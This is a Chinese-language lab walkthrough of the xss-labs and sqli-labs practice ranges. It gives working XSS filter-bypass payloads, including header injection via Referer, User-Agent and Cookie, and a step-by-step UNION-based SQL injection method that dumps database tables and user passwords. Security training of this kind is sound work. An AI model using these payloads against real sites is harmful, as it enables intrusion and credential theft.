<h1 align=center>欢迎来到level3</h1>

<h2 align=center>没有找到和相关的结果.</h2><center>
<form action=level3.php method=GET>
<input name=keyword  value=''>	
<input type=submit name=submit value=搜索 />
</form>

</center><center><img src=level3.png></center>

<h3 align=center>payload的长度:0</h3></body>

</html>

```

尝试闭合单引号

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957476.png)





查看源代码

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957990.png)

`htmlspecialchars()` 是 PHP 中用于将特殊字符转换为 HTML 实体的核心安全函数，主要用于防止 XSS（跨站脚本攻击）并确保内容在 HTML 中正确显示。

---

| 原字符 | 正确转换后的 HTML 实体 | 触发条件 |
| :---: | :---: | :---: |
| `&` | `&` | **始终转换** |
| `"` | `"` | 默认（`ENT_COMPAT`）或 `ENT_QUOTES` |
| `'` | `'`（或 `'`*） | **仅当设置 **`ENT_QUOTES`** 时** |
| `<` | `<` | **始终转换** |
| `>` | `>` | **始终转换** |


使用 htmlspecialchars 函数对 $str 进行转义



利用onfocus事件绕过

```javascript
' onfocus=javascript:alert()‘
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957196.png)

利用onclick事件绕过

```plain
' οnclick='javascript:alert()'
```











#### level4_onfocus和οnclick
```plain
" onfocus=javascript:alert() "
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957997.png)

#### level5_**a href标签法**
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957242.png)







![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958585.png)



分析源代码：

```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>

</center>';
?>
<center><img src=level5.png></center>

<?php 
```

+ strtolower()函数用于将字符串中的所有大写字母转换为小写字母。非字母字符（如数字、符号、中文等）不受影响。
+ str_replace()函数，用于在字符串中查找并替换指定的内容。





这里我们使用**a href标签法**

[HTML 标签参考手册](https://www.w3school.com.cn/tags/index.asp)



关于 HTML 中 `<a>` 标签（超链接）的 `href` 属性用法：[HTML  标签_](https://www.w3school.com.cn/tags/tag_a.asp)

`href`属性的意思是：当标签`<a>`被点击的时候，就会触发执行跳转，跳转到一个网站，还可以触发执行一段js代码。

**基础语法**

`<a>` 标签通过 `href` 属性定义链接目标，基本格式如下：

```html
<a href="目标地址">链接文本或元素</a>

```

+ **点击元素**：可以是文本、图片或其他 HTML 内容。
+ **行为**：点击后默认在当前页面跳转（可通过 `target` 属性控制）。





添加一个标签得闭合前面的标签，构建payload：

```html
"> <a href=javascript:alert()>xxx</a> <"
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958768.png)

之后点击`xxx`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958450.png)





#### level6_大写绕过
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958703.png)

检查源代码：

```php
$str2=str_replace("<script","<scr_ipt",$str);//绕过js标签
$str3=str_replace("on","o_n",$str2);//绕过onfocus事件
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);//绕过a href标签
```



没有添加小写转化函数 ，我们使用大写绕过：

构建payload：

```html
"> <sCript>alert()</sCript> <"

" Onfocus=javascript:alert() "

"> <a hRef=javascript:alert()>x</a> <"
```

三种都可以通关

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958610.png)

#### level7_双写绕过
```php
$str =strtolower( $_GET["keyword"]);//大写转小写
$str2=str_replace("script","",$str);//过滤js标签
$str3=str_replace("on","",$str2);//过滤onfocus标签
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);//过滤a href标签
```



出现了俩个没见过东西：

[HTML 标签参考手册](https://www.w3school.com.cn/tags/index.asp)

`src(source)`:[HTML  标签_source](https://www.w3school.com.cn/tags/tag_source.asp)

标签用于为媒体元素（视频/音频/图像）指定多个媒体资源。

`data`:（level6也有）[HTML  标签_data](https://www.w3school.com.cn/tags/tag_data.asp)

标签用于添加给定内容的机器可读翻译。





我们可以利用双拼写来绕过，

比如on，我们可以写成oonn，当中间on被删掉的时候，就变成了on

比如script，可以写成scscriptipt，当script被删掉的时候，就变成了script

所以这关主要是双拼写绕过，方法有很多，



```html
"> <a hrehreff=javasscriptcript:alert()>x</a> <"
    
"> <scscriptript>alert()</scscriptript> <"

"oonnfocus=javascript:alert() "     
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958793.png)















#### level8_Unicode解码
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958226.png)

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
```

过滤掉了onfocus、src、data、href、script、"



这一关利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议

在线Unicode编码：[在线Unicode编码解码 - 码工具](https://www.matools.com/code-convert-unicode)





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958663.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958995.png)



























#### level9_Unicode解码
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958229.png)





```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>

</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```



使用`strpos($str7, 'http://')`检查`$str7`中是否包含子字符串`http://`。

+ `strpos()`返回`http://`首次出现的位置（整数），若未找到则返回`false`。
+ 由于使用严格相等`===`比较返回值是否为`false`，只有完全未找到`http://`时条件成立。



那么我们可以在上一关的基础上加上`http://`，并且还需要加注释符将`http://`注释掉。



构建payload：`&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;/*http://*/`





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959191.png)











#### level10_onfocus
来到第十关发现没有输入框

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959790.png)

分析源码：

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];//使用GET传参"t_sort"
$str22=str_replace(">","",$str11);//过滤掉了<>号
$str33=str_replace("<","",$str22);//过滤掉了<>号
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>

</center>';
?>
```

构建payload：

```plain
?t_sort=" onfocus=javascript:alert() type="text
```

`type="text`覆盖原输入的`type`属性。原本是`type="hidden"`（隐藏输入框），注入后改为`type="text"`，使输入框可见。

浏览器解析HTML时，若同一属性重复，通常以最后一个为准。因此注入的`type="text"`可能覆盖原隐藏属性，强制显示输入框以便用户交互







![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959543.png)



之后点击输入框

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959333.png)

















#### level11_referer
测试一下关键字

```xml
" sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> &#106;
```

```plain
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];//将HTTP请求头中的Referer信息赋值给变量$str11
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>

</center>';
?>
```

REFERER（Referer）是 **HTTP 请求头** 中的一个字段，用于表示当前请求的 **来源页面 URL**。它是浏览器在向服务器发送请求时自动附加的信息，告诉服务器用户是从哪个页面跳转过来的。





先尝试一下第10关的`?t_sort=" onfocus=javascript:alert() type="text`

发现双引号被实体化

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959136.png)





试一下referer

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959411.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959920.png)



将referer改为：

```plain
" onfocus=javascript:alert() type="text
```







![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959669.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959090.png)



#### level12_User-Agent头
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959376.png)隐藏的input标签可以插入type="text"显示 ，可以一个一个尝试：

测试一下关键字

```xml
" sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> &#106;
```

第一、二传参没有回显

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959975.png)





第三个：可以看到被实体化

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000685.png)





只能是第四个：

ua是User-Agent头，使用bp抓包改ua头就可以了





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000373.png)



构造UA头：

```plain
" onfocus=javascript:alert() type="text
```

使用bp抓包

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000772.png)





将UA头修改

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000841.png)



放行后点击框

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000572.png)

#### level13_cookie头
依旧尝试前三个不成功

测试关键字

```xml
" sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> &#106;
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001394.png)











名字是t_cook，考虑到是cookie头，我们先看一下这个网页的cookie



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001153.png)







将这里修改为：

```plain
“ onfocus=javascript:alert() type="text
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001360.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001920.png)











![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001445.png)





#### level14
[xss-labs靶场-第十四关 iframe和exif xss漏洞 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/282983.html)

HTML `<iframe>` 标签：作用是标记一个内联框架！！一个内联框架被用来在当前 HTML 文档中嵌入另一个文档。





#### level15_ng-include
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001826.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001160.png)





`ng-include` 是 AngularJS 中的一个指令，用于在 HTML 中动态加载并嵌入外部的 HTML 片段。它允许你将一个外部的 HTML 文件或模板包含到当前的页面中，从而实现模块化和代码复用。







包含第一关

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001686.png)











进行了实体转义：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001859.png)





构造payload：

```plain
?src='level1.php?name=<img src=XXX onmouseover=alert()>'
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001888.png)



















#### level16_空格实体转义
测试一下关键字：

```plain
?keyword=" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P</> <sCriPt> <a hReF=javascript:alert()> &#106;
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001496.png)

将字母小写化，再把script和/替换成空格，最后将空格给实体化



空格可以用回车来代替绕过，回车的url编码是`%0a`，再配合上不用 / 的`<img>`、`<details>`、`<svg>`等标签

```python
?keyword=<svg%0Aonload=alert()>
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002288.png)











#### level17_embed
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002425.png)



`embed` 是 HTML 中的一个标签，用于在网页中嵌入外部内容，例如 PDF 文件、视频、音频、Flash 动画等。

embed将一个swf文件引到浏览器端







payload：

```plain
?arg01= onmouseover&arg02=alert(1)
```

`onmouseover`：表示当鼠标移动到该标签上时就会触发执行某项动作

火狐不可以，edge可以：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002531.png)











#### level18_embed
与level17一样：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002007.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002406.png)



# 3、sqli-labs

##  **sql注入一般步骤：**

**一、判断注入类型**

**数字型注入**

1. url为` http://127.0.0.1/sqli-labs/Less-2/?id=1'`时，因为有一个多余的"单引号"使查询语句错误
2. url为 `http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=1`时，没有报错
3. url为` http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=2`时，由于1=2不成立，也会报错

满足这三个，基本上就是数字注入了

**字符型注入**

1. url为 `http://127.0.0.1/sqli-labs/Less-2/?id=1'`时，数据库认为id叫做1'。查询之后发现没有这个id而返回错误。（在字符型注入中，需要考虑引号的闭合）
2. url为 `http://127.0.0.1/sqli-labs/Less-2/?id=1' and '1'='1 `在'1'='1之后没有加上'是因为传参时输入的内容已经被' '包围。

满足这俩个，基本上就是字符注入了

**二、后台查询列数**

使用`order by`试出数据库列数

url为 `http://127.0.0.1/sqli-labs/Less-2/?id=1' order by 数字 `（如果试4时有错误，3时正确，那么列数为3）

**三、找显示位**

使用`union select`找出会返回客户端并显示的列。如果有3列时，应该这么写

url为` http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,2,3`

加入显示位是3，这就意味着数据库开放了5个“窗口”用来显示内容，用查询到的数据，在这些窗口显示数据

**四、查库名，获取当前数据名和版本号**

联合查询：`select database();`

下面是查看数据库的版本和数据库信息

假如显示位是3，`http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,version,database()`

**五、查表名**

找到库名以后，使用`http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,2,table_name from information_schema.tables where table_schema='库名' `(如果库名是字符型，此处库名要转成十六进制)

**information_schema:**

这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库

**六、查列名**

找到表之后，使用`http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,2,column_name from information_schema.columns where table_name='表名' `(如果表名是字符型，此处库名要转成十六进制)

如果表数或列数过多，可以在最后使用limit加上limit 0，5相当于检索1-5条信息

**七、查具体数据**

找到列之后，使用`http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,2,group_concat("要查询的数据") from 列名`



总结：

```plain
?id=1
?id=1'	//出错
?id=1 and 1=1	//正常
?id=1 and 1=2	//出错      //检查为数字注入
 
?id=1' and '1'='1	//正常
?id=1'	//出错		//检查为字符注入
 
?id=1 order by 3		//查列数
?id=-1 union select 1,2,3		//找显示位
?id=-1 union select 1,database(),version()		//查库名，获取当前数据名和版本号
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名'		//查表名
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名'		//查列名
?id=-1 union select 1,2,group_concat(username ,id , password) from 列名	//查字段
 
```

## 以下是 SQL 注入攻击的一般步骤总结
---

**1. 探测注入点**

+ **目标**：寻找可能存在漏洞的输入参数（如 URL 参数、表单字段、Cookie 等）。
+ **方法**：  
    - 在参数后添加单引号 `'`，观察是否返回数据库错误（如 `You have an error in your SQL syntax`）。  
    - 使用逻辑测试：  

```sql
id=1' and '1'='1  -- 正常返回  
id=1' and '1'='2  -- 无返回（说明条件生效，存在注入）
```

---

**2. 判断注入类型**

+ **基于错误（Error-Based）**：直接通过报错信息获取数据（如 `extractvalue(1, concat(0x7e, version()))`）。  
+ **联合查询（UNION-Based）**：利用 `UNION SELECT` 回显数据。  
+ **布尔盲注（Boolean Blind）**：通过页面返回真假状态推断数据（如 `AND 1=1` / `AND 1=2`）。  
+ **时间盲注（Time-Based）**：通过延时函数判断条件（如 `SLEEP(5)`）。

---

**3. 确定字段数**

+ **方法**：使用 `ORDER BY` 递增测试，直到报错：  

```sql
id=1' ORDER BY 3 --+  -- 正常  
id=1' ORDER BY 4 --+  -- 报错（字段数为3）
```

+ **目的**：为后续 `UNION SELECT` 匹配列数。

---

**4. 联合查询提取数据**

+ **步骤**：  
    1. 强制原查询返回空：`id=-1' UNION SELECT 1,2,3 --+`。  
    2. 观察页面回显位置（如显示数字 `2` 或 `3`）。  
    3. 替换为敏感函数：  

```sql
id=-1' UNION SELECT 1,database(),version() --+  
-- 回显数据库名和版本
```

---

**5. 提取数据库信息**

+ **核心表**：通过 `information_schema` 获取元数据：  

```sql
-- 获取所有表名
UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() --+

-- 获取某表的列名（假设表名为users）
UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' --+

-- 提取数据（假设列名为username,password）
UNION SELECT 1,group_concat(username,':',password),3 FROM users --+
```

## 靶场练习
#### Less-1-单引号_字符型
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004608.png)

提示你输入数字值的ID作为参数



**1.**输入`?id=1`,数字不同，显示不同

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004879.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004485.png)

这里进入到数据库里面查询

**2.**接下来我们判断sql语句是否是拼接，是字符型还是数字型。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004952.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004988.png)



**3.**可以根据结果指定是**字符型**且存在sql注入漏洞。因为该页面存在回显，所以我们可以使用联合查询。

联合查询原理：联合查询就是两个sql语句一起查询，两张表具有相同的列数，且字段名是一样的。



---

##### 关于字符型注入：
---

1. **Less-1 的 SQL 语句结构**

假设后端代码逻辑如下（字符型注入）：

```sql
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
```

+ `$id` 是用户输入的值，用单引号 `'` 包裹。
+ 注入的目标是**闭合单引号**并插入恶意代码，再用注释符 `--+` 忽略后续内容。

---

2. **两种输入对比分析**

**场景 1：**`?id=1 order by 3 --+`

生成的 SQL 语句为：

```sql
SELECT * FROM users WHERE id='1 order by 3 -- ' LIMIT 0,1;
```

+ **问题**：
    - 输入值 `1 order by 3 --+` 被包裹在单引号内，整体视为一个字符串。
    - `order by 3` 是字符串内容，而非 SQL 语法。
    - 实际执行的语句等价于：

```sql
SELECT * FROM users WHERE id='1 order by 3 ' LIMIT 0,1;
```

    - 数据库会尝试查找 `id` 值为 `1 order by 3` 的记录（视为字符串），但表中无此数据，导致无回显。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005086.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005688.png)

**场景 2：**`?id=1' order by 3 --+`

生成的 SQL 语句为：

```sql
SELECT * FROM users WHERE id='1' order by 3 -- ' LIMIT 0,1;
```

+ **关键点**：
    - 单引号 `'` 用于闭合原始 SQL 中的 `id='...'`。
    - `order by 3` 被成功注入到 SQL 语句中，成为有效语法。
    - 注释符 `--+` 忽略后续的 `' LIMIT 0,1`，最终执行：

```sql
SELECT * FROM users WHERE id='1' order by 3;
```

    - 此语句合法，会按第三列排序并返回数据，页面正常回显。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005300.png)

---

3. **字符型注入 & 数字型注入**
+ **字符型注入**（如 Less-1）：
    - 参数被单引号包裹（`id='$id'`）。
    - **必须闭合单引号**才能注入代码，例如 `1' [payload] --+`。
    - 未闭合单引号会导致语法错误或逻辑失效。
+ **数字型注入**（如 Less-2）：
    - 参数未被引号包裹（`id=$id`）。
    - 可直接注入代码，例如 `1 order by 3 --+`。
    - 无需处理引号闭合问题。

---

##### 关于注释符：
---

1. **原始 SQL 语句的结构**

假设后端代码的 SQL 语句如下（字符型注入）：

```sql
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
```

其中 `$id` 是用户输入的值，用单引号 `'` 包裹。

---

2. **输入 **`?id=1' order by 3`** 的解析**

当输入 `1' order by 3` 时，SQL 语句变为：

```sql
SELECT * FROM users WHERE id='1' order by 3' LIMIT 0,1;
```

+ **问题**：用户输入的单引号 `'` 未闭合，导致语句变成：

```sql
id='1' order by 3' ...
```

末尾多了一个单引号 `'`，破坏了 SQL 语法。

+ **结果**：数据库抛出语法错误，但应用程序可能配置为 **不显示错误信息**（如关闭错误回显），导致页面无回显。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005805.png)

---

3. **输入 **`?id=1' order by 3 --+`** 的解析**

当输入 `1' order by 3 --+` 时，SQL 语句变为：

```sql
SELECT * FROM users WHERE id='1' order by 3 -- ' LIMIT 0,1;
```

+ **注释符 **`--+`** 的作用**：
    - `--` 是 SQL 的单行注释符，`+` 在 URL 中被解析为空格，因此 `--+` 等效于 `-- `（注释符后必须跟空格）。
    - 注释符会忽略后续所有内容，即 `' LIMIT 0,1` 被注释掉。
+ **最终语句**：

```sql
SELECT * FROM users WHERE id='1' order by 3;
```

    - 单引号 `'` 被正确闭合，语句语法合法。
    - `order by 3` 会按第三列排序，如果表中存在至少 3 列，查询成功执行，页面正常回显数据。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005417.png)

---

4. **关键差异总结**

| **输入** | **SQL 语句** | **语法状态** | **回显原因** |
| --- | --- | --- | --- |
| `?id=1' order by 3` | `id='1' order by 3' LIMIT ...` | **语法错误** | 错误被隐藏，无回显 |
| `?id=1' order by 3 --+` | `id='1' order by 3` | **语法正确** | 查询正常执行，回显数据 |


补充： **注释符 **`--+`

+ `--`:  
在 SQL 中表示**单行注释**，用于忽略后续代码。
+ `+`:  
URL 中的 `+` 会被解码为**空格**。由于某些数据库（如 MySQL）要求注释符 `--` 后必须有一个空格，`--+` 确保注释生效，避免语法错误。

---

##### 解题：
**第一步：**首先知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数。

联合查询特点：

1、要求多条查询语句的查询列数是一致的！  
2、要求多条查询语句的查询的每一列的类型和顺序最好一致  
3、union关键字默认去重，如果使用union all 可以包含重复项

```plain
?id=1'order by 3 --+
```

显示正常没有超出列数

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005515.png)

```plain
?id=1'order by 4 --+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005398.png)

现在知道表格有三列

**第二步：**爆出显示位，就是看看表格里面那一列是在页面显示的。

```plain
?id=-1' union select 1,2,3--+
```

---

##### **使用 **`id=-1`** 的目的**
将 `id` 设置为 `-1`（或任意数据库中不存在的值）：

```sql
SELECT * FROM users WHERE id = '-1' UNION SELECT 1,2,3 -- '
```

此时：

+ **第一条查询 (**`id=-1`**)**：由于数据库中不存在 `id=-1` 的记录，这条查询会返回空结果。
+ **第二条查询 (**`UNION SELECT 1,2,3`**)**：会成为唯一的返回结果，页面会直接显示 `1,2,3`，从而暴露注入点的位置



如果使用 `id=1`：

```sql
SELECT * FROM users WHERE id = '1' UNION SELECT 1,2,3 -- '
```

数据库会返回两条结果：

1. `id=1` 的真实数据。
2. `UNION SELECT 1,2,3` 的注入数据。

但页面可能只会渲染第一条结果（真实数据），导致攻击者无法看到 `UNION SELECT` 的结果。而通过 `id=-1` 强制让原查询失效，可以确保注入结果直接暴露。

+ `id=-1`** 的作用**：绕过原查询的结果，让 `UNION SELECT` 的注入内容成为唯一输出。
+ **实战意义**：这是 SQL 注入中常见的技巧，用于探测回显点，进而提取数据库信息（如版本、表名、字段值等）。

---

可以看到是第二列和第三列里面的数据是显示在页面的。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005510.png)

**第三步：**获取当前数据名和版本号，这个涉及mysql数据库的一些函数，记得就行。





**补充知识：**

`version()`:查看数据库版本

`database()`:查看使用的数据库

`user()`:查看当前用户

`limit`:limit子句分批来获取所有数据

`group_concat()`:一次性获取所有的数据库信息





```sql
?id=-1'union select 1,database(),version()--+
```

通过结果知道当前数据是`security`,版本是`5.7.26`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005737.png)



**第四步：** 爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。

该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。

```sql
?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
```

爆出了表名

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005991.png)

看到了`users`,于是我们查看一下这张表的字段名





**补充知识:**

`information_schema.tables`:包含了数据库里所有的表

`table_name`:表名

`table_schema`:数据库名

`column_name`:字段名



 **第五步**：爆字段名





```plain
?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
```

该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005209.png)



看到了username和password字段，

然后我们就去查询字段信息







**第六步**：查字段

```plain
?id=-1' union select 1,2,group_concat(username ,id , password) from users--+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005147.png)

​                       

 获得了所有的账号和密码，这样我们就顺利的拿到了很重要的信息。



#### Less-2-数字型
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005914.png)



首先判断下，这个是什么注入



```plain
?id=1'　　//出错

?id=1 and 1=1 //正常

?id=1 and 1=2　//出错
```

可以确定为数字注入：



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005317.png)





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005239.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005060.png)









接下来我们去查库



列数为3：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005050.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005135.png)





爆出显示位：



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005087.png)





爆表：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005490.png)





爆字段名：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005206.png)













查字段：得到了重要信息


![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022106426.png)






#### Less-3-单引号+括号_字符型
单引号测试报错,显示应该为单引号和括号组合的闭合方式

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022106699.png)



```plain
?id=1') --+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006872.png)



得到数据有三列

```plain
?id=1') order by 4 --+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006047.png)





```plain
?id=-1') union select 1,2,3 --+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006421.png)



```plain
?id=-1') union select 1,database(),version() --+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006465.png)



```sql
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= 'security' --+
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006702.png)



```sql
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
```

